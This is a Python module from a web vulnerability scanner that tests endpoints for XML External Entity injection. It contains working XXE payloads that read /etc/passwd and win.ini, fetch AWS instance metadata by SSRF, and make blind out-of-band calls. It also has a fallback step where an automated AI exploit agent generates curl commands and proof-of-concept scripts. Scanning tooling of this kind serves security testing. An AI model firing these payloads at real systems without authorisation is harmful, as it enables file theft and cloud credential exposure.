"""
cyberm4fia-scanner - XML External Entity (XXE) Scanner
Tests for XXE injection in XML-accepting endpoints
"""

from utils.colors import log_info, log_success, log_warning
from utils.request import smart_request
from utils.request import ScanExceptions

# ─────────────────────────────────────────────────────
# XXE Payloads
# ─────────────────────────────────────────────────────

# Classic XXE — file read
XXE_FILE_READ = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

XXE_FILE_READ_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

# XXE — SSRF (internal network)
XXE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>"""

# XXE via parameter entity (blind)
XXE_BLIND = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{oob_host}/xxe-test">
  %xxe;
]>
<root><data>test</data></root>"""

# XXE via XInclude (no DOCTYPE control)
XXE_XINCLUDE = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>"""

# XXE via SVG upload
XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>"""

# Signatures that confirm file read
LINUX_SIGNATURES = ["root:x:0:0", "bin/bash", "sbin/nologin", "/home/"]
WINDOWS_SIGNATURES = ["[fonts]", "[extensions]", "for 16-bit app support"]
AWS_SIGNATURES = ["ami-id", "instance-id", "local-ipv4"]

def detect_xml_endpoints(url, delay=0):
    """Discover endpoints that accept XML input."""
    xml_endpoints = []

    # Common XML-accepting paths
    xml_paths = [
        "/api/upload",
        "/api/import",
        "/api/xml",
        "/xmlrpc.php",
        "/soap",
        "/wsdl",
        "/api/v1/import",
        "/api/v2/import",
        "/api/parse",
        "/api/data",
        "/upload",
        "/import",
    ]

    # Check Content-Type acceptance
    test_xml = '<?xml version="1.0"?><test>1</test>'

    for path in xml_paths:
        try:
            test_url = url.rstrip("/") + path
            resp = smart_request(
                "post",
                test_url,
                data=test_xml,
                headers={"Content-Type": "application/xml"},
                delay=delay,
                timeout=5,
            )
            if resp.status_code not in (404, 405):
                xml_endpoints.append(
                    {
                        "url": test_url,
                        "status": resp.status_code,
                        "accepts_xml": "xml"
                        in resp.headers.get("content-type", "").lower(),
                    }
                )
        except ScanExceptions:
            pass

    # Also test the main URL
    try:
        resp = smart_request(
            "post",
            url,
            data=test_xml,
            headers={"Content-Type": "application/xml"},
            delay=delay,
            timeout=5,
        )
        if resp.status_code not in (404, 405):
            xml_endpoints.append(
                {
                    "url": url,
                    "status": resp.status_code,
                    "accepts_xml": True,
                }
            )
    except ScanExceptions:
        pass

    return xml_endpoints

def test_xxe_payload(url, payload, delay=0):
    """Send an XXE payload and analyze the response."""
    try:
        resp = smart_request(
            "post",
            url,
            data=payload,
            headers={
                "Content-Type": "application/xml",
                "Accept": "*/*",
            },
            delay=delay,
            timeout=10,
        )
        return resp.text, resp.status_code
    except ScanExceptions:
        return None, None

def scan_xxe(url, delay=0):
    """Main XXE scanner entry point."""
    log_info(f"Starting XXE scan on {url}")
    findings = []

    # Step 1: Discover XML endpoints
    xml_endpoints = detect_xml_endpoints(url, delay)
    if not xml_endpoints:
        log_info("No XML-accepting endpoints discovered.")
        # Still try main URL with XXE
        xml_endpoints = [{"url": url, "status": 0, "accepts_xml": False}]

    for ep in xml_endpoints:
        ep_url = ep["url"]
        log_info(f"Testing XXE on: {ep_url}")

        # Test 1: Linux file read
        body, status = test_xxe_payload(ep_url, XXE_FILE_READ, delay)
        if body:
            for sig in LINUX_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE",
                            "url": ep_url,
                            "payload": "file:///etc/passwd",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE File Read confirmed at {ep_url}. "
                                f"/etc/passwd content leaked."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE File Read: {ep_url}")
                    break

        # Test 2: Windows file read
        body, status = test_xxe_payload(ep_url, XXE_FILE_READ_WIN, delay)
        if body:
            for sig in WINDOWS_SIGNATURES:
                if sig.lower() in body.lower():
                    findings.append(
                        {
                            "type": "XXE",
                            "url": ep_url,
                            "payload": "file:///c:/windows/win.ini",
                            "evidence": f"Response contains '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE File Read (Windows) confirmed at {ep_url}."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE Windows File Read: {ep_url}")
                    break

        # Test 3: SSRF via XXE (AWS metadata)
        body, status = test_xxe_payload(ep_url, XXE_SSRF, delay)
        if body:
            for sig in AWS_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE-SSRF",
                            "url": ep_url,
                            "payload": "http://169.254.169.254/...",
                            "evidence": f"AWS metadata leaked: '{sig}'",
                            "severity": "CRITICAL",
                            "description": (
                                f"XXE-SSRF confirmed at {ep_url}. "
                                f"AWS instance metadata accessible."
                            ),
                        }
                    )
                    log_success(f"[CRITICAL] XXE-SSRF AWS Metadata: {ep_url}")
                    break

        # Test 4: XInclude
        body, status = test_xxe_payload(ep_url, XXE_XINCLUDE, delay)
        if body:
            for sig in LINUX_SIGNATURES:
                if sig in body:
                    findings.append(
                        {
                            "type": "XXE-XInclude",
                            "url": ep_url,
                            "payload": "xi:include file:///etc/passwd",
                            "evidence": f"XInclude file read: '{sig}'",
                            "severity": "CRITICAL",
                            "description": f"XInclude injection at {ep_url}.",
                        }
                    )
                    log_success(f"[CRITICAL] XInclude injection: {ep_url}")
                    break

        # Check for XML parsing error messages (potential blind XXE)
        if body and any(
            err in body.lower()
            for err in [
                "xml parsing error",
                "xmlsyntaxerror",
                "premature end",
                "entity",
                "dtd",
                "doctype",
                "xerces",
                "sax",
            ]
        ):
            findings.append(
                {
                    "type": "XXE-Potential",
                    "url": ep_url,
                    "severity": "MEDIUM",
                    "evidence": "XML parser error messages detected",
                    "description": (
                        f"XML parser error messages at {ep_url}. "
                        f"Blind XXE may be possible with OOB techniques."
                    ),
                }
            )
            log_warning(f"[MEDIUM] XML parser errors at: {ep_url}")

    # ── AI Exploit Agent (Final Escalation) ──
    if not findings and xml_endpoints:
        try:
            from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
            agent = get_exploit_agent()
            if agent and agent.available:
                from utils.waf import waf_detector
                waf_name = getattr(waf_detector, "detected_waf", "") or ""

                for ep in xml_endpoints[:3]:
                    ctx = ExploitContext(
                        url=ep["url"],
                        vuln_type="XXE",
                        waf=waf_name,
                        http_method="POST",
                        content_type="application/xml",
                    )
                    result = agent.exploit_xxe(ctx)
                    if result and result.success:
                        findings.append({
                            "type": "XXE",
                            "url": ep["url"],
                            "payload": result.payload,
                            "evidence": result.evidence[:200],
                            "severity": "CRITICAL",
                            "description": (
                                f"AI-discovered XXE at {ep['url']}. "
                                f"Confidence: {result.confidence:.0f}%"
                            ),
                            "source": f"AI Agent (Gen-{result.iteration})",
                            "ai_curl": result.curl_command,
                            "ai_poc_script": result.python_script,
                            "ai_nuclei": result.nuclei_template,
                        })
                        log_success(
                            f"[CRITICAL] XXE at: {ep['url']} "
                            f"[AI Agent Gen-{result.iteration}]"
                        )
                        break
        except ImportError:
            pass

    log_success(f"XXE scan complete. Found {len(findings)} issue(s).")
    return findings
